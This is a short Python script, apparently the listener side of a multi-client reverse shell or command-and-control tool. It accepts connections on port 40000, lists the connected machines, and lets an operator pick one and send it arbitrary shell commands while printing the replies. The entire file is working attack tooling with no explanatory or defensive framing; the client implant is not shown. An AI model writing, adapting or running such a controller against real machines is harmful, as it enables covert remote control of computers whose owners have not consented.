import threading
import socket,time

s = socket.socket()

s.bind(('',40000))

s.listen(5)

add_lis=[]
conn_lis=[]

def accept_conn():
	while True:
		print("waiting")
		conn,add= s.accept()
		#print(add)
		add_lis.append(add)
		conn_lis.append(conn)


def control_pc():
	while True:
		print("LIST OF CONNECTIONS :")
		
		for i in add_lis:
			print(add_lis.index(i),i[0],i[1])
		selection = input(" select connection >>>")
		if selection =='skip':
			continue
		conn = conn_lis[int(selection)]
		while True:
			cmd=input('>>')
			if cmd=='end' or cmd=='END':
				break
			conn.sendall(str.encode(cmd))
			response = str(conn.recv(40820),'utf-8')
			print(response)



t = threading.Thread(target=accept_conn)
t1=threading.Thread(target=control_pc)



t.start()
t1.start()
t1.join()
t.join()

print("end..")
